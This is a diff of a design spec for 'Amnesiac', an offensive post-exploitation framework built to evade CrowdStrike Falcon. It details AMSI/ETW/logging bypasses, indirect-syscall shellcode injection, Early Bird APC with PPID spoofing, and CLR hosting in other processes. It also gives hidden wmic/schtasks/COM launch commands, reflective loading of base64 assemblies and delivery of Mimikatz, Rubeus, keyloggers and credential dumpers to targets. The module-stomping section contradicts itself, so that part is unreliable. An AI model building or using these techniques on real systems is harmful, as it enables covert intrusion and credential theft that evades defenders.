@@ -1,16 +1,21 @@
-# Amnesiac Stealth Overhaul — Design Spec
+# Amnesiac Stealth Overhaul — Design Spec (Revised)
 **Date:** 2026-05-23  
+**Revision:** v2 — Extended bypass catalog, modular payload builder, extended AmnesiacLoader  
 **Status:** Approved — pending implementation  
-**Approach:** Option B (PS + in-memory .NET assemblies)  
 **Author:** Red Team Operator  
 
 ---
 
 ## 1. Objective
 
-Extend Amnesiac into a red-team-grade post-exploitation framework that operates with zero disk writes on targets, evades CrowdStrike Falcon behavioral detection, and works reliably from both non-domain-joined and domain-joined operator machines connected to an internal network.
+Extend Amnesiac into a red-team-grade post-exploitation framework that:
+- Operates with zero disk writes on targets by default
+- Evades CrowdStrike Falcon behavioral, memory, and ETW/AMSI detection
+- Works from both non-domain-joined and domain-joined operator machines
+- Delivers all tool modules over the named-pipe channel or operator HTTP server
+- Generates payloads with selectable, composable evasion technique profiles
 
-The framework must remain pure PowerShell in appearance while gaining binary-level evasion capabilities through an embedded in-memory .NET assembly. All existing commands and sessions remain fully functional.
+All existing Amnesiac commands and sessions remain fully functional.
 
 ---
 
@@ -19,15 +24,15 @@ The framework must remain pure PowerShell in appearance while gaining binary-lev
 ### Scenario 1 — Non-Domain-Joined Operator Machine
 - Operator runs Amnesiac on a machine not joined to the target domain
 - Domain credentials provided via `runas /netonly /user:DOMAIN\user powershell.exe`
-- Has remote access to a target (WMI / PSRemoting / SMB / RCE)
-- Generates payload in Amnesiac → executes on target → gets named-pipe session back
-- All target-side operation is in memory only — no disk writes on target
+- Has remote access or command execution on a target
+- Generates payload → executes on target → gets named-pipe session back
+- All target-side operation is in memory only
 
 ### Scenario 2 — Assumed Breach (Domain-Joined Operator Machine)
 - Operator machine is domain-joined to the target environment
 - Runs Amnesiac natively with domain token
 - Enumerates and exploits across the network
-- When a new target is compromised, applies Scenario 1 approach for that target
+- When a new target is compromised, applies Scenario 1 approach for lateral movement
 
 Both scenarios share the same payload generation, tool delivery, and session management code paths.
 
@@ -35,46 +40,90 @@ Both scenarios share the same payload generation, tool delivery, and session man
 
 ## 3. Architecture Overview
 
-Changes are organised into four independent layers. Each layer can be implemented and tested separately. Existing functionality is untouched unless explicitly noted.
+Five layers. All changes in `Amnesiac.ps1` except where new source files are noted.
 
 ```
 Amnesiac.ps1 (modified)
 │
+├── LAYER 0 — Bypass Library (NEW)
+│   Catalog of selectable AMSI/ETW bypass implementations.
+│   Each technique is a self-contained PS snippet or C# method.
+│   Payload builder pulls from this catalog based on operator config.
+│
 ├── LAYER 1 — Disk Elimination
 │   Removes all automatic disk writes on operator and target machines.
 │
-├── LAYER 2 — Payload Generation & C# Assembly
-│   Extends stealth payload format; adds embedded .NET loader; hardens protocol.
+├── LAYER 2 — Payload Assembly Engine (REVISED)
+│   Replaces single stealth format with a modular builder.
+│   Operator configures AMSI method, ETW method, launcher, encoding,
+│   jitter profile, obfuscation level. Builder assembles to order.
 │
 ├── LAYER 3 — In-Memory Tool Delivery
-│   Replaces GitHub downloads with in-pipe module streaming from operator cache.
+│   Operator HTTP server as primary. GitHub preserved as optional fallback.
+│   Binary tools delivered over pipe, loaded via Reflection.Assembly.
 │
 └── LAYER 4 — Operational Guardrails
-    Adds engagement profiles, runas/netonly awareness, environment keying, startup OPSEC summary.
+    Engagement profiles, runas/netonly detection, AES pipe encryption,
+    env keying, startup OPSEC banner, session-unique protocol markers.
 
-AmnesiacLoader/ (new)
-├── Loader.cs       — indirect syscall injection
+AmnesiacLoader/ (new C# assembly)
+├── Loader.cs       — injection engine (multiple techniques)
+├── Bypass.cs       — AMSI/ETW bypass from C# (new)
 ├── CallStack.cs    — call stack frame spoofing
 ├── SleepMask.cs    — memory encryption during sleep
-└── Build.ps1       — compiles DLL → base64 → embeds in Amnesiac.ps1
-
-CLAUDE.md           — project objectives, build instructions, contribution guide
-CHANGELOG.md        — all changes with operational context
+├── UnmanagedPS.cs  — CLR hosting: run PS in non-powershell processes (new)
+├── Stomper.cs      — module stomping for self-hiding (new)
+├── AmnesiacLoader.csproj
+└── Build.ps1       — compile → base64 → embed in Amnesiac.ps1
 ```
 
 ---
 
-## 4. Layer 1 — Disk Elimination
+## 4. Layer 0 — Bypass Technique Catalog
 
-### 4.1 Problem
+A catalog of independently tested bypass implementations. Techniques are decoupled from payload format. The payload builder composes them. New techniques can be added without touching the builder.
 
-Amnesiac unconditionally creates `C:\Users\Public\Documents\Amnesiac\` with eight subfolders at startup (Amnesiac.ps1 lines 60–63). Throughout a session it writes tool scripts, keylogger output, screenshots, downloaded files, clipboard data, TGT data, command history, and generated `.exe` payloads to this tree on the operator machine. On targets, tool modules are downloaded from GitHub to `Scripts\`.
+### 4.1 AMSI Bypass Techniques
 
-### 4.2 Changes
+| Name | Mechanism | CS detection risk |
+|------|-----------|-------------------|
+| `pageguard` | Set PAGE_GUARD on `AmsiScanBuffer` page in amsi.dll. Register VEH that catches `STATUS_GUARD_PAGE_VIOLATION`, sets return value to `AMSI_RESULT_CLEAN` (1), restores PAGE_GUARD, continues execution. No byte modification of the function. | Low |
+| `hwbp` | Set hardware breakpoint (DR0) on `AmsiScanBuffer` entry. Register VEH that catches `EXCEPTION_SINGLE_STEP`, sets RAX=0 (AMSI_RESULT_CLEAN), advances RIP past return check. Zero memory modification. Requires re-arm per new thread. | Low–medium |
+| `fail` | Set `_amsiInitFailed` field in AMSI context to `true` via reflection, preventing AMSI context initialization. | Medium |
+| `direct` | Overwrite first bytes of `AmsiScanBuffer` with `xor eax,eax; ret`. Detectable by integrity-checking memory scanners. | High |
 
-**Startup — remove unconditional folder creation**
+**Default: `pageguard`** — borrowed from amsi-pageguard-veh technique. Hardest to detect because function bytes are unmodified.
 
-Replace lines 60–63 with a conditional block gated on `$global:DiskMode`:
+**Reference implementations:**
+- PS fallback (Layers 0–2): Pure PowerShell via P/Invoke for VEH registration and VirtualProtect
+- C# primary (when AmnesiacLoader available): `AmnesiacLoader.Bypass` class (more reliable, less PS-patterned)
+
+### 4.2 ETW Bypass Techniques
+
+| Name | Mechanism |
+|------|-----------|
+| `provider` | Disable `PSEtwLogProvider` via reflection — sets `m_enabled` field to 0. PS-specific. Current implementation. |
+| `patch` | Patch `EtwEventWrite` in ntdll.dll to return immediately (`xor eax,eax; ret`). Kills all userland ETW from the process. Broader but more detectable. |
+| `thread` | Set per-thread ETW disable flag via undocumented TEB field. Narrower scope, lower visibility than process-wide patch. |
+
+**Default payload ETW: `provider`** (lightweight, PS-specific).  
+**Default tool execution ETW: `patch`** (broader coverage when AmnesiacLoader is delivering heavy modules).
+
+### 4.3 SBL Bypass
+
+Single technique: set `ScriptBlock.checkScriptBlockLoggingCache` field to `false` via reflection. No alternatives needed.
+
+---
+
+## 5. Layer 1 — Disk Elimination
+
+### 5.1 Problem
+
+Amnesiac unconditionally creates `C:\Users\Public\Documents\Amnesiac\` with eight subfolders at startup (Amnesiac.ps1 lines 60–63). Throughout a session it writes tool scripts, keylogger output, screenshots, downloaded files, clipboard data, TGT data, command history, and generated `.exe` payloads to this tree. On targets, tool modules are downloaded from GitHub to `Scripts\`.
+
+### 5.2 Changes
+
+**Startup — conditional folder creation**
 
 ```powershell
 $global:DiskMode = $false   # default: no disk writes
@@ -92,185 +141,149 @@ function Initialize-DiskStructure {
 Initialize-DiskStructure
 ```
 
-**New `diskmode` command**
-
+**`diskmode` command:**
 ```
 diskmode          — show current state
-diskmode on       — enable disk writes (restores original behaviour)
+diskmode on       — enable disk writes
 diskmode off      — disable disk writes (default)
 ```
 
-**Artifact in-memory store (operator side)**
-
-All data that would have gone to disk subfolders is instead buffered in memory on the operator machine:
-
+**In-memory artifact store:**
 ```powershell
 $global:AmnesiacArtifacts = @{
     Keylogger   = [System.Collections.Generic.List[string]]::new()
     Screenshots = [System.Collections.Generic.List[byte[]]]::new()
-    Downloads   = @{}    # filename -> byte[]
+    Downloads   = @{}
     Clipboard   = [System.Collections.Generic.List[string]]::new()
     TGTs        = [System.Collections.Generic.List[string]]::new()
 }
 ```
 
-**New session commands for artifact management**
-
+**Artifact session commands:**
 ```
 artifacts               — list captured artifacts in memory
 artifacts keylogger     — display keylogger output
-artifacts screenshots   — list captured screenshots
-save <type> [path]      — write specific artifact type to operator-side disk
+save <type> [path]      — write specific artifact type to operator disk
 save all                — dump all artifacts to operator disk
 ```
 
-**exe payload format**
-
-The `exe` format inherently requires disk (PS1ToEXE writes a file). When `diskmode` is off and the operator selects `exe` format, display a warning:
-
+**exe payload format:** requires disk write. When `diskmode off`, warn and block:
 ```
- [!] exe format requires a disk write for the payload file.
-     Enable diskmode or switch to stealth/gzip format.
-     Run 'diskmode on' to proceed with exe generation.
+ [!] exe format requires a disk write. Enable diskmode or switch format.
 ```
-
-### 4.3 What is NOT changed
-
-- The `exe` payload format itself — still works when `diskmode on`
-- `Download <file>` command — still works; file saved to operator disk (operator machine write is acceptable)
-- History tracking via `Set-Variable MaximumHistoryCount 32767` — unchanged (PS in-memory history)
 
 ---
 
-## 5. Layer 2 — Payload Generation & C# Assembly
+## 6. Layer 2 — Payload Assembly Engine
 
-### 5.1 Stealth payload format extensions
+### 6.1 Overview
 
-The `stealth` format added in the previous session (ETW bypass, SBL bypass, random vars, gzip, jitter) is extended with:
+Replaces the single `stealth` format with a configured modular builder. `toggle` remains as a shortcut to cycle `payload encoding`. All other payload properties are configured via `payload` subcommands. The builder composes bypass snippets from Layer 0 into a single script, then applies the selected encoding.
 
-**Extension A — Alternative execution launchers**
-
-New `launcher` command cycles through execution vectors that change the parent process visible in EDR telemetry:
+### 6.2 Operator Commands
 
 ```
-launcher          — show current launcher
-launcher          — cycle to next (same command, like toggle)
+payload                         — show current payload configuration
+payload amsi [pageguard|hwbp|fail|direct]
+payload etw  [provider|patch|thread]
+payload launcher [ps|wmi|schtask|com]
+payload encoding [gzip|b64|raw|pwraw]
+payload jitter [off|low|medium|high]
+payload obfuscation [low|medium|high]
+payload key [hostname|domain|user] <value>
+payload key clear
+payload key show
+payload reset                   — restore all defaults
 ```
 
-Available launchers:
+`toggle` → cycles `payload encoding` in sequence (b64 → raw → pwraw → gzip → stealth-default).
 
-| Name | Command generated | Parent process on target |
-|------|-------------------|--------------------------|
-| `ps` (default) | `powershell.exe -ep bypass -Window Hidden -c "..."` | Whatever called it |
-| `wmi` | `wmic process call create "powershell -ep bypass ..."` | `WmiPrvSE.exe` |
-| `schtask` | `schtasks /create` → `/run` → `/delete` (one-shot, self-deletes) | `svchost.exe` (Task Scheduler) |
-| `com` | `MMC20.Application.Document.ActiveView.ExecuteShellCommand(...)` | `mmc.exe` |
+### 6.3 Default Profile
 
-The selected launcher wraps whichever payload format (`stealth`, `gzip`, `b64`, etc.) is currently active. These are independent toggles.
+```
+AMSI bypass:     pageguard
+ETW bypass:      provider
+SBL bypass:      on
+Launcher:        ps
+Encoding:        gzip
+Jitter:          medium (1–5s random sleep)
+Obfuscation:     high
+Environment key: none
+```
 
-`$global:LauncherFormat = 'ps'` — set at startup, cycled with `launcher` command.
+### 6.4 Payload Construction Order
 
-**Extension B — Session-unique protocol markers**
+1. **Header block** — load System.Core assembly
+2. **ETW bypass block** — selected from Layer 0 catalog
+3. **SBL bypass block** — always included
+4. **AMSI bypass block** — selected from Layer 0 catalog; if AmnesiacLoader available, calls `[AmnesiacLoader.Bypass]::PatchAmsiPageGuard()` (or hwbp variant) before pipe setup; otherwise uses PS-only P/Invoke implementation
+5. **Jitter block** — random sleep per selected profile
+6. **Environment key checks** — abort conditions (if keys configured)
+7. **Pipe setup block** — with obfuscation applied, type names split, session-unique EndMarker and BufferSize baked in
+8. **Pipe loop block** — command receive/execute/send cycle
+9. **Gzip+base64 encoding** — entire script compressed; decompressor wrapper with mixed-case method names
+10. **Launcher wrapping** — selected launcher wraps the encoded payload
 
-Replace hardcoded `#END#` delimiter and fixed 1028-byte buffer with session-unique values generated at startup:
+### 6.5 Obfuscation Levels
+
+| Level | Variable name length | Type-name split parts | Extra concat noise |
+|-------|---------------------|----------------------|--------------------|
+| `low` | 4–6 chars | 2 parts | None |
+| `medium` | 6–10 chars | 3 parts | Occasional string ops |
+| `high` | 12–20 chars | 4–6 parts | Additional concat and char array construction |
+
+### 6.6 Session-Unique Protocol Markers
+
+Generated once at Amnesiac startup, baked into all generated payloads:
 
 ```powershell
-# Generated once per Amnesiac session
 $global:EndMarker  = -join ((65..90 + 97..122) | Get-Random -Count 8 | % {[char]$_})
 $global:BufferSize = @(512, 1024, 2048, 4096) | Get-Random
 ```
 
-Both values are baked into every generated payload so the target uses the same marker and buffer size as the operator. `#END#` and 1028 no longer appear anywhere in generated payloads.
+`#END#` and 1028 no longer appear in any generated payload.
 
-**Extension C — AES pipe channel encryption**
+### 6.7 Launcher Variants
 
-All pipe I/O encrypted with AES-128 CBC after initial handshake.
+| Name | Parent process on target | Generated command |
+|------|--------------------------|-------------------|
+| `ps` (default) | Inherits caller | `powershell.exe -ep bypass -Window Hidden -c "..."` |
+| `wmi` | `WmiPrvSE.exe` | `wmic process call create "powershell -ep bypass ..."` |
+| `schtask` | `svchost.exe` (Task Scheduler) | `schtasks /create` → `/run` → `/delete` (self-deleting one-shot) |
+| `com` | `mmc.exe` | `MMC20.Application.Document.ActiveView.ExecuteShellCommand(...)` |
 
-Key exchange protocol (on first connect):
-1. Target generates random 16-byte session key
-2. Target encrypts session key with pre-shared key (PSK) using AES-128
-3. Target sends encrypted session key as first message (before hostname/whoami)
-4. Operator decrypts session key using PSK
-5. All subsequent messages encrypted with session key
+### 6.8 AmnesiacLoader and Payload Delivery
 
-PSK configuration:
+**AmnesiacLoader is NOT embedded in generated payloads.** Embedding a full .NET DLL (~100KB+) in every payload would make payloads large and conspicuous. The payload itself always uses the PS-level AMSI bypass from Layer 0.
+
+AmnesiacLoader is delivered to the target *after* a session is established, on demand:
+
+1. Operator types `load loader` (or it is sent automatically when `Migrate` is invoked)
+2. Amnesiac sends the AmnesiacLoader base64 blob over the existing named pipe
+3. Target session executes: `[Reflection.Assembly]::Load([Convert]::FromBase64String($loaderB64)) | Out-Null`
+4. `Stomper.StompAndLoad()` is called immediately after to hide the assembly in backed memory
+5. All subsequent `Migrate`, `PInject`, and bypass commands on that session use AmnesiacLoader
+
+The operator-side `$AmnesiacLoaderB64` constant in `Amnesiac.ps1` exists solely as the source to send to targets — it is never loaded on the operator machine.
+
+---
+
+## 7. AmnesiacLoader — C# Assembly (Extended)
+
+### 7.1 Project Structure
+
 ```
-psk <passphrase>    — set pre-shared key (derived via SHA-256 → first 16 bytes)
-psk                 — show current PSK status (masked)
-psk reset           — revert to default (derived from pipe name)
-```
-
-Default PSK = SHA-256 of pipe name, first 16 bytes — no configuration needed for basic use.
-
-All encryption/decryption handled in `InteractWithPipeSession` transparently. Operator types commands as normal.
-
-### 5.2 AmnesiacLoader — embedded C# assembly
-
-**Purpose**
-
-A compiled C# DLL embedded as a base64 constant in Amnesiac.ps1. Loaded into target process memory via `[Reflection.Assembly]::Load()` — never written to disk. Provides binary-level evasion capabilities not achievable in pure PowerShell.
-
-**Capabilities**
-
-| Capability | Class | Key detail |
-|------------|-------|------------|
-| Indirect syscall injection | `AmnesiacLoader.Injector` | SSN resolution via EAT walking on ntdll.dll; VEH redirection to ntdll stubs; no `VirtualAllocEx`/`CreateRemoteThread` |
-| Call stack spoofing | `AmnesiacLoader.CallStack` | Synthetic ROP frames inserted before syscall dispatch; EDR sees `ntdll→kernelbase→kernel32` call chain |
-| Sleep masking | `AmnesiacLoader.SleepMask` | AES-encrypts implant memory region during `Sleep()`; decrypts on wake; `PAGE_NOACCESS` during sleep |
-| PE/shellcode injection | `AmnesiacLoader.Injector` | Accepts shellcode byte array; injects via syscall path above |
-
-**Public API surface (called from PS)**
-
-```csharp
-namespace AmnesiacLoader {
-    public class Injector {
-        // Inject shellcode into target PID via indirect syscalls
-        public static bool InjectShellcode(int pid, byte[] shellcode);
-        // Inject shellcode into new suspended process
-        public static bool InjectNewProcess(string processPath, byte[] shellcode);
-    }
-    public class SleepMask {
-        // Encrypt current process memory region during sleep
-        public static void MaskedSleep(int milliseconds, IntPtr regionBase, int regionSize);
-    }
-}
+AmnesiacLoader/
+├── Loader.cs       — injection engine
+├── Bypass.cs       — AMSI/ETW bypass methods
+├── CallStack.cs    — call stack spoofing
+├── SleepMask.cs    — sleep masking
+├── UnmanagedPS.cs  — CLR hosting (run PS in arbitrary process)
+├── Stomper.cs      — module stomping (self-hiding)
+└── AmnesiacLoader.csproj
 ```
 
-**Loading in Amnesiac.ps1**
-
-```powershell
-# Constant at top of file — base64 encoded DLL
-$AmnesiacLoaderB64 = "<base64 string — updated by Build.ps1>"
-
-# Lazy loader — only loads assembly when first needed
-function Import-AmnesiacLoader {
-    if(-not $global:AmnesiacLoaderAssembly){
-        $bytes = [Convert]::FromBase64String($AmnesiacLoaderB64)
-        $global:AmnesiacLoaderAssembly = [Reflection.Assembly]::Load($bytes)
-    }
-    return $global:AmnesiacLoaderAssembly
-}
-```
-
-**Integration with existing commands**
-
-- `Migrate <pid>` — calls `AmnesiacLoader.Injector.InjectShellcode()` instead of downloading PInject.ps1 from GitHub
-- `PInject <pid> <hex>` — same replacement
-- Both commands remain identical from operator perspective
-
-**Build process**
-
-`AmnesiacLoader/Build.ps1`:
-1. `dotnet build AmnesiacLoader.csproj -c Release`
-2. Read output DLL as bytes
-3. Base64 encode
-4. Replace `$AmnesiacLoaderB64 = "..."` constant in Amnesiac.ps1
-5. Print checksum for verification
-
-Operators building from source run `Build.ps1` to refresh the embedded assembly. Pre-built base64 blob included in repo for operators without .NET SDK.
-
-**Project file: AmnesiacLoader.csproj**
-
+**Project file:**
 ```xml
 <Project Sdk="Microsoft.NET.Sdk">
   <PropertyGroup>
@@ -284,122 +297,243 @@ Operators building from source run `Build.ps1` to refresh the embedded assembly.
 </Project>
 ```
 
-Target framework: `net462` (runs on all Windows machines with .NET 4.6.2+, which is virtually all modern Windows targets).
+### 7.2 SSN Resolution — Hell's Gate + Halo's Gate
+
+Handles both clean and EDR-hooked ntdll without disk reads:
+
+1. Walk ntdll.dll EAT at runtime to enumerate all exports
+2. For each syscall stub, check first bytes:
+   - `4C 8B D1 B8 XX 00 00 00` (standard prelude, unhooked) → extract SSN from bytes 4–5
+   - First bytes differ (EDR hook, e.g. `E9 XX XX XX XX` JMP) → scan neighboring syscall stubs at ±1 offset to derive SSN by sequential numbering
+3. Cache resolved SSNs in a static dictionary for reuse
+
+**Syscalls resolved and used:**
+- `NtAllocateVirtualMemory` — allocate in target process
+- `NtWriteVirtualMemory` — write shellcode to target
+- `NtProtectVirtualMemory` — set page permissions
+- `NtOpenProcess` — open handle to target
+- `NtCreateThreadEx` — create remote thread
+- `NtQueueApcThread` — queue APC for Early Bird injection
+- `NtResumeThread` — resume suspended thread
+- `NtSuspendThread` — suspend thread for hijacking
+- `NtGetContextThread` / `NtSetContextThread` — thread context manipulation
+
+### 7.3 Injection Techniques (`Loader.cs`)
+
+**Public API:**
+
+```csharp
+namespace AmnesiacLoader {
+    public class Injector {
+        // Inject shellcode into existing process via thread hijacking (indirect syscalls)
+        public static bool InjectShellcode(int pid, byte[] shellcode);
+
+        // Spawn new process with PPID spoofed to spoofParentPid, inject via Early Bird APC
+        public static bool InjectNewProcess(string processPath, byte[] shellcode, int spoofParentPid);
+
+        // CLR hosting: load PS runtime inside target process, run psScript without powershell.exe
+        public static bool InjectUnmanagedPS(int pid, string psScript);
+
+        // Spawn new process with PPID spoof, CLR hosting inside it
+        public static bool SpawnUnmanagedPS(string processPath, string psScript, int spoofParentPid);
+    }
+}
+```
+
+**Early Bird APC injection flow (`InjectNewProcess`):**
+1. `CreateProcessW` with `EXTENDED_STARTUPINFO_PRESENT` flag and `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` set to `spoofParentPid` — PPID spoofed in process creation record
+2. `NtAllocateVirtualMemory` — allocate RW region in new process
+3. `NtWriteVirtualMemory` — write shellcode
+4. `NtProtectVirtualMemory` — change to RX
+5. `NtQueueApcThread` — queue APC to suspended main thread pointing at shellcode
+6. `NtResumeThread` — APC fires before any user code runs
+
+**Thread hijacking flow (`InjectShellcode`):**
+1. `NtOpenProcess` — open target with appropriate access
+2. `NtAllocateVirtualMemory` → `NtWriteVirtualMemory` → `NtProtectVirtualMemory`
+3. `NtSuspendThread` on a target thread (prefer threads in wait state)
+4. `NtGetContextThread` — save full context
+5. `NtSetContextThread` — redirect RIP to shellcode, set up return trampoline
+6. `NtResumeThread`
+
+**CLR hosting (`InjectUnmanagedPS`):**
+1. Inject shellcode stub into target via Early Bird APC (shellcode calls `CoInitializeEx` + `CorBindToRuntimeEx`)
+2. Stub creates `ICorRuntimeHost`, starts runtime, creates `AppDomain`
+3. Loads `System.Management.Automation.dll` reflectively into the domain
+4. Creates `Runspace`, pipes `psScript` (the Amnesiac named-pipe client script) as a command
+5. Invokes — target process now runs the PS implant with no `powershell.exe` anywhere in the tree
+
+**PPID spoofing default:** `explorer.exe` PID (obtained by enumerating running processes). Configurable.
+
+**Call stack spoofing** (`CallStack.cs`) is invoked before each `NtXxx` dispatch: inserts synthetic ROP frames sourced from `ntdll.dll` and `kernelbase.dll` gadgets so the call stack shows a legitimate `ntdll → kernelbase → kernel32` origin.
+
+### 7.4 Bypass Methods (`Bypass.cs`)
+
+```csharp
+namespace AmnesiacLoader {
+    public class Bypass {
+        // PAGE_GUARD + VEH on AmsiScanBuffer — no byte modification
+        public static void PatchAmsiPageGuard();
+
+        // Hardware breakpoint (DR0) on AmsiScanBuffer + VEH
+        public static void PatchAmsiHardwareBreakpoint();
+
+        // Patch EtwEventWrite in ntdll to ret 0 — kills all userland ETW
+        public static void PatchEtwEventWrite();
+    }
+}
+```
+
+**`PatchAmsiPageGuard` implementation detail:**
+1. `GetProcAddress(amsi.dll, "AmsiScanBuffer")` — get function address
+2. `VirtualProtect(addr, 1, PAGE_GUARD | PAGE_EXECUTE_READ, out old)` — apply guard
+3. `AddVectoredExceptionHandler` with handler that:
+   - Checks `ExceptionCode == STATUS_GUARD_PAGE_VIOLATION` and `ExceptionAddress == AmsiScanBuffer`
+   - Sets `ContextRecord.Rax = 1` (AMSI_RESULT_CLEAN)
+   - Sets `ContextRecord.Rip` past the scan — skips to return
+   - Returns `EXCEPTION_CONTINUE_EXECUTION`
+
+**`PatchAmsiHardwareBreakpoint` implementation detail:**
+1. Get `AmsiScanBuffer` address
+2. Set `DR0 = addr`, `DR7 |= (1 << 0)` — enable local hardware breakpoint on thread
+3. Register VEH catching `EXCEPTION_SINGLE_STEP` at `DR0`:
+   - Set `Rax = 1`
+   - Clear `DR6` status bits
+   - Return `EXCEPTION_CONTINUE_EXECUTION`
+
+### 7.5 Sleep Masking (`SleepMask.cs`)
+
+```csharp
+public class SleepMask {
+    // Encrypt regionBase..regionBase+regionSize with AES-128, mark PAGE_NOACCESS, sleep, restore
+    public static void MaskedSleep(int milliseconds, IntPtr regionBase, int regionSize);
+}
+```
+
+Implementation:
+1. Generate random AES-128 key, store in separate non-executable page
+2. `VirtualProtect(regionBase, regionSize, PAGE_READWRITE)` — make region writable for encryption
+3. AES-128 CBC encrypt region in-place
+4. `VirtualProtect(regionBase, regionSize, PAGE_NOACCESS)` — scanner finds nothing
+5. `Sleep(milliseconds)`
+6. `VirtualProtect` → RX, AES decrypt in-place
+7. Zero and free the key page
+
+### 7.6 Module Stomping (`Stomper.cs`)
+
+When AmnesiacLoader is loaded on the target via `[Reflection.Assembly]::Load(bytes)`, it produces unbacked executable memory — a CS memory scanner IOC.
+
+`Stomper` addresses this for the target-side load:
+1. Enumerate loaded modules in the current process
+2. Find a non-critical loaded DLL with a `.text` section of sufficient size (≥ AmnesiacLoader DLL size)
+3. `VirtualProtect` that section to RW
+4. Copy AmnesiacLoader PE bytes into the section
+5. Fix up the in-memory PE headers (relocations, imports) for the new base address
+6. Invoke `Stomper.StompAndLoad()` from the PS payload before any other AmnesiacLoader call
+
+```csharp
+public class Stomper {
+    // Overwrite a loaded DLL's PE header in memory with the AmnesiacLoader header,
+    // making the memory scanner see a file-backed mapping instead of anonymous allocation.
+    // Note: execution still happens from the original CLR-allocated memory;
+    // this is header spoofing, not true code relocation.
+    public static void ConcealLoadedAssembly(Assembly asm, string targetDllName = null);
+}
+```
+
+**Bootstrapping sequence** (no chicken-and-egg): `[Reflection.Assembly]::Load(bytes)` loads AmnesiacLoader into unbacked memory briefly. `Stomper.ConcealLoadedAssembly()` is the first method called after load — it overwrites the in-memory PE header of the just-loaded assembly with the header of a legitimate DLL, changing what the scanner sees from "anonymous" to "backed." The window of exposure is microseconds.
+
+### 7.7 `Migrate` Command Interface (updated)
+
+```
+Migrate <pid>              — thread hijack existing process, inject PS implant
+Migrate new <proc>         — spawn <proc> with PPID spoofed to explorer.exe, Early Bird APC
+Migrate ps <pid>           — CLR hosting in target PID (no powershell.exe in process tree)
+Migrate ps new <proc>      — spawn <proc>, CLR hosting inside it, PPID spoofed
+```
+
+### 7.8 Delivery and Loading Flow
+
+**Operator side (`Amnesiac.ps1`):**
+```powershell
+# Base64 constant at top of Amnesiac.ps1 — updated by Build.ps1
+$AmnesiacLoaderB64 = "<base64 string>"
+```
+This constant is never loaded in the operator's PS process. It exists to be sent to target sessions.
+
+**Target side (via named pipe):**
+
+When `Migrate` or `load loader` is invoked, `Send-Module` delivers AmnesiacLoader over the pipe using the standard module framing protocol. The target PS session executes two sequential commands:
+
+```powershell
+# Step 1 — load assembly (briefly unbacked)
+$_la = [Reflection.Assembly]::Load([Convert]::FromBase64String('<loader_b64>'))
+# Step 2 — conceal header immediately (scanner sees backed memory)
+[AmnesiacLoader.Stomper]::ConcealLoadedAssembly($_la)
+```
+
+After step 2, all AmnesiacLoader classes are available for subsequent session commands. The assembly's in-memory PE header is overwritten to appear as a legitimate loaded DLL.
 
 ---
 
-## 6. Layer 3 — In-Memory Tool Delivery
+## 8. Layer 3 — In-Memory Tool Delivery
 
-### 6.1 Problem
-
-Every tool command (`Mimi`, `Kerb`, `PInject`, `PowerView`, etc.) currently downloads its module from `raw.githubusercontent.com` to the target machine's `Scripts\` folder, then executes it. This creates:
-- A disk write on the target
-- An outbound network call from the target to GitHub (anomalous server behaviour)
-- A known IOC URL pattern that CS and network IDS flag
-
-### 6.2 Tool cache architecture
-
-Tools live only on the operator machine, in a `$global:ToolCache` hashtable populated at startup:
+### 8.1 Tool Cache Architecture
 
 ```powershell
-$global:ToolCache = @{}   # toolname (string) -> script content (string)
+$global:ToolCache = @{}   # toolname -> script content
 
 function Initialize-ToolCache {
-    # Priority 1: embedded blobs in Amnesiac.ps1 (base64+gzip constants)
-    # Priority 2: local Tools\ directory (for dev/lab use)
-    # Priority 3: operator HTTP server (File-Server.ps1, fallback only)
-    # Never fetches from GitHub
+    # Priority 1: embedded gzip+base64 constants in Amnesiac.ps1
+    # Priority 2: local Tools\ directory
+    # Priority 3: operator HTTP server (on demand via 'serve')
+    # Priority 4: GitHub (optional fallback — preserved, not blocked)
 }
 ```
 
-### 6.3 Tool tiers
+### 8.2 Tool Tiers
 
-| Tier | Tools | Storage | Load trigger |
-|------|-------|---------|--------------|
-| **Core** (always available) | SimpleAMSI, NETAMSI, Token-Impersonation, Invoke-SMBRemoting, Invoke-WMIRemoting, Find-LocalAdminAccess | Embedded as gzip+base64 constants in Amnesiac.ps1 | At startup, always |
-| **Standard** (on demand) | PowerView, Invoke-SessionHunter, PassSpray, Validate-Credentials, Ask4Creds, Invoke-Patamenia, TGT_Monitor, HiveDump, dumper, klg, cms, Tkn_Access_Check | Loaded from local `Tools\` at startup if present | At startup if folder exists |
-| **Heavy** (operator-staged) | Suntour (Mimikatz), Ferrari (Rubeus), ppl, TermsrvPatcher, RDPKeylog.exe | Fetched from operator HTTP server on demand | When command invoked |
+| Tier | Tools | Storage |
+|------|-------|---------|
+| Core (always) | SimpleAMSI, NETAMSI, Token-Impersonation, Invoke-SMBRemoting, Invoke-WMIRemoting, Find-LocalAdminAccess | Embedded gzip+base64 constants in Amnesiac.ps1 |
+| Standard | PowerView, Invoke-SessionHunter, PassSpray, Validate-Credentials, Ask4Creds, Invoke-Patamenia, TGT_Monitor, HiveDump, dumper, klg, cms, Tkn_Access_Check | Local `Tools\` at startup |
+| Heavy | Suntour (Mimikatz), Ferrari (Rubeus), ppl, TermsrvPatcher, RDPKeylog.exe | Operator HTTP server on demand |
 
-### 6.4 In-pipe module delivery
+### 8.3 GitHub Fallback Behaviour
 
-When an operator runs a tool command in a session, `Send-Module` streams the tool source over the existing named pipe:
-
-```powershell
-function Send-Module {
-    param(
-        [string]$ToolName,
-        $StreamWriter,
-        $StreamReader
-    )
-    $code = $global:ToolCache[$ToolName]
-    if(-not $code){
-        Write-Host " [-] Module '$ToolName' not in cache. Run 'modules' to see available tools." -ForegroundColor Red
-        return $false
-    }
-    # Large tools chunked into 4KB segments to avoid pipe buffer overflow
-    $chunks = [System.Collections.Generic.List[string]]::new()
-    for($i = 0; $i -lt $code.Length; $i += 4096){
-        $chunks.Add($code.Substring($i, [Math]::Min(4096, $code.Length - $i)))
-    }
-    # Send load command to target: assemble chunks into scriptblock, execute in memory
-    # Target never writes to disk — all execution via [scriptblock]::Create()
-    return $true
-}
+GitHub is preserved as an optional fallback. When a tool is not in the local cache:
+```
+ [~] 'PowerView' not in local cache — falling back to GitHub.
+     Pre-cache with 'modules reload' before live engagements.
 ```
 
-### 6.5 RepoURL default change
+`$global:ServerURL` defaults to `http://<operator-IP>:8080`. Can be overridden with `RepoURL <url>`.
 
-`$global:ServerURL` changes from GitHub to operator's local HTTP server:
+### 8.4 In-Pipe Module Delivery
 
-```powershell
-# Old
-$global:ServerURL = "https://raw.githubusercontent.com/Leo4j/Amnesiac/main/Tools"
